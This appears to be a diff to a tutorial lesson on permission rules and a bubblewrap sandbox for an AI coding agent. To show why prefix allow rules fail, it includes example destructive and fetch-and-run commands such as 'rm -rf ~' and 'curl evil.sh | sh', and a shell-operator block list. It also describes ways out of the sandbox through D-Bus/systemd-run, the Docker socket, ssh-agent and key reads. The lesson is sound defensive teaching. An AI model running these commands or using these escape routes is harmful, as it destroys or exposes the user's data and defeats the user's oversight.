@@ -15,21 +15,29 @@ You need both, because neither is enough on its own.
 
 **Why prefix rules cannot make `bash` safe.** The obvious way to cut the remaining prompts is a rule like "allow anything starting with `pytest`". It works for `pytest -q`. Then:
 
-- **Operators.** `pytest -q && rm -rf ~` starts with `pytest`. So do `pytest; curl evil.sh | sh`, `pytest > important.py` and `` pytest `rm x` ``. A string prefix sees one command where the shell runs several. Your policy refuses to let an allow rule match a command containing any shell operator. That closes the obvious hole and nothing more.
+- **Operators.** `pytest -q && rm -rf ~` starts with `pytest`. So do `pytest; curl evil.sh | sh`, `pytest > important.py`, `pytest & rm -rf ~` and `` pytest `rm x` ``. A string prefix sees one command where the shell runs several. Your policy refuses to let an allow rule match a command containing any shell operator. That closes the obvious hole and nothing more.
 - **Scripts the agent writes.** `bash(pytest*)` allows `pytest`, and `pytest` runs `conftest.py`. The agent can edit `conftest.py`. An allowed command runs code the model wrote a minute ago. The same goes for `make`, `npm test`, `python setup.py` and every build tool.
 - **`python -c`.** `bash(python*)` looks like "allow running Python", but it is "allow running anything", because `python -c "import os; os.system('...')"` contains no shell operators at all.
 
 So an allow rule is a way to stop being asked about commands you would approve anyway. It is not a security boundary. Something has to limit the damage when an allowed or approved command does something you did not expect. That is the sandbox.
 
-**What bubblewrap does.** [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) starts a process in new Linux namespaces without needing root:
+**What bubblewrap does.** [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) starts a process in new Linux namespaces without needing root. Your harness asks for all of them (`--unshare-all`) and then sets up the filesystem:
 
-- A **mount namespace**: the process gets its own view of the filesystem. Your harness bind-mounts `/` **read-only**, then bind-mounts the project folder on top of it **writable**, gives it a fresh `/dev` and `/proc`, and a private, empty `/tmp`. Any write outside the project fails with `Read-only file system`.
-- A **network namespace** (`--unshare-net`): the process gets its own network stack with nothing in it but an unconnected loopback. It cannot reach the internet, and it cannot reach services on your machine either, including your model server on `localhost:1234`.
-- `--die-with-parent`: if the harness dies, the sandboxed command dies too.
+- A **mount namespace**: the process gets its own view of the filesystem. `/` is bind-mounted **read-only** (mounts below it, such as a second disk under your home, are read-only too), the project folder is bind-mounted on top **writable**, and `/dev`, `/proc`, `/tmp` and `/run` are fresh, private ones. A write to your files outside the project fails with `Read-only file system`. A write to `/tmp` or `/run` succeeds, lands in a throwaway tmpfs, and disappears when the command ends.
+- A **network namespace**: the process has its own network stack with only an empty loopback. It cannot reach the internet, and `localhost` inside is not your machine's `localhost`. Your model server on port 1234 is not there.
+- A **pid namespace**: the command sees only its own processes. When the command ends, everything it started goes with it, including a `(setsid sleep 30 &)` that left its process group. `--die-with-parent` does the same if the harness dies, and `--new-session` keeps the command from pushing keystrokes into a terminal it inherited.
 
-**What it does not do.** It does not stop reads. A sandboxed command can still `cat ~/.ssh/id_ed25519`, your shell history, or a `.env` file next to the project. What keeps that data from leaving is the network being off: the command can read the key but has nowhere to send it. (It can still print it, and the output goes back to the model, which talks to your local server. With a local model that stays on your machine. With a hosted one, it would not.) Turn the network on and the read-only filesystem protects your files from damage, not from being copied. This is also not production isolation: same kernel, same user, no limits on CPU, memory or processes. A fork bomb still works. It is a seatbelt against a confused model, not a wall against an attacker.
+**The hole a read-only filesystem leaves: Unix sockets.** "Read-only" stops a process from changing a file. It does not stop it from *connecting* to a Unix socket file, and a socket is a door to a program running outside the sandbox, with that program's powers. On a normal Linux desktop:
 
-Two more limits. The sandbox covers `bash` only. Your file tools run inside the harness process, so the "stay inside the project" rule for them is `Workspace.resolve`, which you also build here. And anything inside the project is writable, including `.git/hooks`, which run outside the sandbox the next time *you* commit.
+- **D-Bus**, at `/run/user/<uid>/bus`. Through it, `systemd-run --user --wait bash -c '...'` asks your user's systemd to run a command for you, outside every namespace, with write access to your home directory and the network.
+- **Docker**, at `/var/run/docker.sock`. Whoever can talk to it can start a container that mounts `/` writable. That is root on your machine.
+- **ssh-agent**, at `$SSH_AUTH_SOCK`. `ssh-add -l` lists your keys, and the agent will sign with them for anyone who asks.
+
+A sandbox made only of a read-only `/` and `--unshare-net` lets a command do all three; that was checked on the machine this course was built on. The fixes: a private `/run` (which also hides `/var/run`, a symlink to it on most systems) puts the D-Bus and Docker sockets out of sight; the private `/tmp` hides sockets there (`/tmp/ssh-*`, `/tmp/.X11-unix`); `--unsetenv` removes `DBUS_SESSION_BUS_ADDRESS`, `SSH_AUTH_SOCK` and `XDG_RUNTIME_DIR`, so programs are not told where to look; and the network namespace also cuts off "abstract" Unix sockets, which have no file at all. The tests check the D-Bus, Docker, `systemd-run` and environment-variable cases. Those are the doors this course knows about. A socket somewhere else (under your home directory, say, as rootless Docker uses) is still reachable. Turning the network on (`--share-net`) brings back the abstract sockets, along with everything on `localhost`.
+
+**What it does not do.** It does not stop reads. A sandboxed command can still `cat ~/.ssh/id_ed25519`, your shell history, or a `.env` file next to the project. With the network off it has no direct way to send them anywhere, but it can print them, and the output goes back to the model. With a local model that stays on your machine. With a hosted one, it would not. Turn the network on and the read-only filesystem protects your files from damage, not from being copied. And this is not production isolation: same kernel, same user, no limits on CPU, memory or process count (a fork bomb still works), and whatever sockets or devices you did not think of. It is a seatbelt against a confused model, not a wall against an attacker.
+
+Two more limits. The sandbox covers `bash` only. Your file tools run inside the harness process, so the "stay inside the project" rule for them is `Workspace.resolve`, which you also build here. (The pid namespace matters for that too: a background process left behind by `bash` could swap a symlink between `resolve` checking a path and the file tool opening it.) And anything inside the project is writable, including `.git/hooks`, which run outside the sandbox the next time *you* commit.
 
 ## How Claude Code does it
 
@@ -57,37 +65,39 @@ Extend your `agent/` package. Tests are in `lessons/05-permissions-and-sandboxin
 
 - `SandboxConfig(enabled: bool = True, network: bool = False, extra_writable: list[Path] = [])`, a dataclass (use a default factory for the list).
 - `build_bwrap_argv(command: str, cwd: Path, root: Path, cfg: SandboxConfig) -> list[str]` returns exactly, in this order:
-  - `["bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--tmpfs", "/tmp", "--bind", str(root), str(root)]`
+  - `["bwrap", "--unshare-all"]`
+  - then `"--share-net"` if `cfg.network` is true
+  - then `["--die-with-parent", "--new-session", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--tmpfs", "/tmp", "--tmpfs", "/run", "--bind", str(root), str(root)]`
   - then `["--bind", str(p), str(p)]` for each path in `cfg.extra_writable`
-  - then `"--unshare-net"` if `cfg.network` is false
-  - then `["--die-with-parent", "--chdir", str(cwd), "--", "bash", "-c", command]`
+  - then `["--unsetenv", "DBUS_SESSION_BUS_ADDRESS", "--unsetenv", "SSH_AUTH_SOCK", "--unsetenv", "XDG_RUNTIME_DIR", "--chdir", str(cwd), "--", "bash", "-c", command]`
 
-  Order matters. bwrap applies mounts in sequence, each on top of the earlier ones. If `--tmpfs /tmp` came after the project bind, a project under `/tmp` (every pytest `tmp_path` is) would be hidden by the empty tmpfs.
-- `sandbox_available() -> bool`: `bwrap` is on `PATH` and `bwrap --ro-bind / / true` exits 0. Being installed is not enough. Some systems forbid unprivileged user namespaces, and then bwrap fails at run time.
+  Order matters. bwrap applies mounts in sequence, each on top of the earlier ones. If `--tmpfs /tmp` came after the project bind, a project under `/tmp` (every pytest `tmp_path` is) would be hidden by the empty tmpfs. For the same reason, raise `ValueError` if `root` or an extra path is `/run`, `/var/run` or below them: the private `/run` would hide it.
+- `sandbox_available() -> bool`: `bwrap` is on `PATH` and a probe with the real flags exits 0, for example `build_bwrap_argv("true", Path("/"), Path("/tmp"), SandboxConfig())`. Being installed is not enough, and neither is `bwrap --ro-bind / / true`. Some systems forbid unprivileged user namespaces or some of the namespaces `--unshare-all` asks for, and then bwrap fails at run time.
 
 **`agent/tools/shell.py`**
 
-- `run_shell(ws: Workspace, command: str, timeout: int) -> tuple[int | None, str]` is lesson 2's command runner, made public: combined output, the process-group kill on timeout, and the capture cap all stay the same. The exit code is `None` on timeout. When `ws.sandbox` is set and `enabled`, run `build_bwrap_argv(command, ws.root, ws.root, ws.sandbox)` instead of `["bash", "-c", command]`. Lesson 11 calls `run_shell` directly.
+- `run_shell(ws: Workspace, command: str, timeout: int) -> tuple[int | None, str]` is lesson 2's command runner, made public: combined output, the process-group kill on timeout, and the capture cap all stay the same. Two fixes while you are here. Kill the process group after a normal exit too, so `server &` does not outlive the call. And never wait on the output pipe once the command has exited: a process that left the group (`setsid`) can hold the pipe open for as long as it lives, and lesson 2's `proc.stdout.close()` then blocks until it exits, timeout or not. Give the reader about 2 seconds and return what you have. The exit code is `None` on timeout. When `ws.sandbox` is set and `enabled`, run `build_bwrap_argv(command, ws.root, ws.root, ws.sandbox)` instead of `["bash", "-c", command]`. Lesson 11 calls `run_shell` directly.
 - The `bash` tool builds its result from `run_shell` exactly as before (`[exit code: N]`, `[timed out after Ns]`). It keeps its `confirm` argument for lesson 2's tests.
 
 **`agent/permissions.py`**
 
 - `Decision`, an enum with `ALLOW`, `DENY`, `ASK`.
 - `Approver = Callable[[str, dict], str]`: called with the tool name and the parsed arguments, returns `"yes"`, `"always"` or `"no"`.
-- `SHELL_OPERATORS = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n")`.
+- `SHELL_OPERATORS = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "&")`. The single `&` catches `pytest -q & rm -rf ~`, a background job followed by a second command.
 - Rules are `"tool"` or `"tool(pattern)"`. A bare rule matches every call to that tool. A pattern is matched with `fnmatch.fnmatchcase` (case-sensitive, `*` matches anything including `/`) against the tool's key argument: `command` for `bash`, `path` for `read_file`, `edit_file` and `write_file`. Other tools have no key argument, so only bare rules match them.
+- **Path rules see the normalized path.** Given a workspace, the path tools' argument is resolved the way `Workspace.resolve` does it and matched as a POSIX path relative to the root. Otherwise `edit_file(src/*)` would allow `src/../setup.py`, and a deny rule `read_file(secrets/*)` would miss `./secrets/key`, `x/../secrets/key`, the absolute spelling, and a symlink into `secrets/`. A path that resolves outside the root never matches an allow rule, not even a bare one (it is matched against its absolute resolved form, for deny rules). Without a workspace, rules see the raw argument.
 - `PermissionPolicy(allow: list[str] = [], deny: list[str] = [], auto_approve: bool = False)`.
-- `check(tool: Tool, args: dict) -> Decision`, first match wins:
+- `check(tool: Tool, args: dict, ws: Workspace | None = None) -> Decision`, first match wins:
   1. a deny rule matches: `DENY` (even for read-only tools, and even when the command has operators)
   2. `tool.read_only`: `ALLOW`
-  3. an allow rule matches: `ALLOW`. A `bash` command containing any of `SHELL_OPERATORS` never matches an allow rule, not even a bare `bash`
+  3. an allow rule matches: `ALLOW`. A `bash` command containing any of `SHELL_OPERATORS` never matches an allow rule, not even a bare `bash`. Neither does a path outside the project
   4. `auto_approve`: `ALLOW`
   5. otherwise `ASK`
 - `remember(tool: Tool, args: dict) -> None` adds an allow rule for this call: `f"bash({glob.escape(command)})"` for `bash`, the bare tool name otherwise. `glob.escape` matters: approving `ls *.py` "always" must not allow `ls a.py`.
 
 **`agent/loop.py`**
 
-`Agent(..., permissions: PermissionPolicy | None = None, approver: Approver | None = None)`.
+`Agent(..., permissions: PermissionPolicy | None = None, approver: Approver | None = None, workspace: Workspace | None = None)`. The agent passes `workspace` to `check`.
 
 - `permissions=None` means no checks: every call runs, as in lessons 1 to 4.
 - The check happens in `_run_tool_call`, after loop detection (a refused call still counts toward the "same call 3 times" rule) and before dispatch.
@@ -108,7 +118,7 @@ Extend your `agent/` package. Tests are in `lessons/05-permissions-and-sandboxin
 - `--sandbox / --no-sandbox` (`argparse.BooleanOptionalAction`, default `None`). With neither flag, use the sandbox when `sandbox_available()`. Print a warning to stderr when running without one. `--sandbox` when bwrap is not usable is an error (exit 1).
 - `--allow RULE`, repeatable, collected into a list (default `[]`).
 - The approver is a `rich` prompt: it shows the tool and the command (or the arguments) and asks `[y]es / [a]lways / [n]o`, default no. End of input or Ctrl-C counts as no.
-- `confirm_bash` is no longer used by the CLI.
+- The CLI passes its `Workspace` to the `Agent`. `confirm_bash` is no longer used by the CLI.
 
 ## Tests
 
@@ -118,7 +128,15 @@ uv run pytest lessons/05-permissions-and-sandboxing --impl solutions/05-permissi
 uv run pytest lessons/05-permissions-and-sandboxing --live            # + network-on check
 ```
 
-Lessons 1 to 4 still apply. Tests marked `sandbox` run real bubblewrap and are skipped when it is not usable. They check that a write inside the project works, a write to `~/.harness_sandbox_probe` fails with `Read-only file system` and leaves no file, a Python socket connect to `127.0.0.1:1234` fails, a project under `/tmp` is visible, and a sandboxed `sleep` is still killed at the timeout. The one live test turns the network on and expects the connect to succeed, so it needs LM Studio listening on port 1234.
+Lessons 1 to 4 still apply. Tests marked `sandbox` run real bubblewrap and are skipped when it is not usable. They check that:
+
+- a write inside the project works, and a write to `~/.harness_sandbox_probe` fails with `Read-only file system` and leaves no file
+- a Python socket connect to `127.0.0.1:1234` fails
+- a project under `/tmp` is visible, and a sandboxed `sleep` is still killed at the timeout
+- the host's D-Bus session socket cannot be connected to, `/var/run/docker.sock` is not visible, `systemd-run --user --wait` fails and creates nothing outside, and `SSH_AUTH_SOCK`, `DBUS_SESSION_BUS_ADDRESS` and `XDG_RUNTIME_DIR` are empty inside (each of the first three is skipped if your machine does not have that socket or program)
+- a `(setsid sleep 30 &)` is gone as soon as the call returns, and the call returns at once
+
+Two tests without the sandbox check that a background job neither holds the call open nor, when it stays in the command's process group, survives it. The one live test turns the network on and expects the connect to succeed, so it needs LM Studio listening on port 1234.
 
 A behavior worth knowing, from `test_real_tmp_is_private`: writing to `/tmp/whatever` inside the sandbox *succeeds*. It lands in the private tmpfs and is gone when the command ends. bwrap even creates the folders above a project under `/tmp` inside that tmpfs, so they exist but are empty: the project's neighbors are simply not there.
 
@@ -161,7 +179,9 @@ The point: the model did not need to be clever. It needed one sentence from the 
 
 - A `--deny RULE` flag, and loading `allow`/`deny` lists from `agent.json`.
 - Split compound commands on operators and allow them only when every part matches an allow rule, the way Claude Code does. Then find the cases a simple split gets wrong (quotes, `$(...)` inside strings, here-docs).
-- Mount sensitive directories (`~/.ssh`, `~/.aws`, `~/.gnupg`) as empty tmpfs inside the sandbox with `--tmpfs`, so reads of them fail too.
+- Mount sensitive directories (`~/.ssh`, `~/.aws`, `~/.gnupg`) as empty tmpfs inside the sandbox with `--tmpfs`, so reads of them fail too. That also hides any agent sockets kept there.
 - Run the file tools through the same rules: deny `read_file(*.env)` and see how `search` still reads those files.
 - An HTTP proxy outside the sandbox with a domain allowlist, so `pip install` works and nothing else does.
-- Find out what `bwrap --unshare-pid` adds, and what a sandboxed `ps aux` shows with and without it.
+- The ssh-agent socket: with the sandbox, `ssh-add -l` says it cannot open a connection to your agent. Without it (`--no-sandbox`), run `ssh-add -l` through the agent and see your keys listed. If you want `git push` over ssh from inside the sandbox, work out what you would have to let through, and what else that lets through.
+- Look for Unix sockets this lesson does not hide: `find ~ /var -type s 2>/dev/null`. For each one, find out what program is listening and what it would do for a stranger.
+- Run `ps aux` inside the sandbox, and again with the pid namespace taken away (`--unshare-all` replaced by `--unshare-user --unshare-net`) to see what the namespace hides.
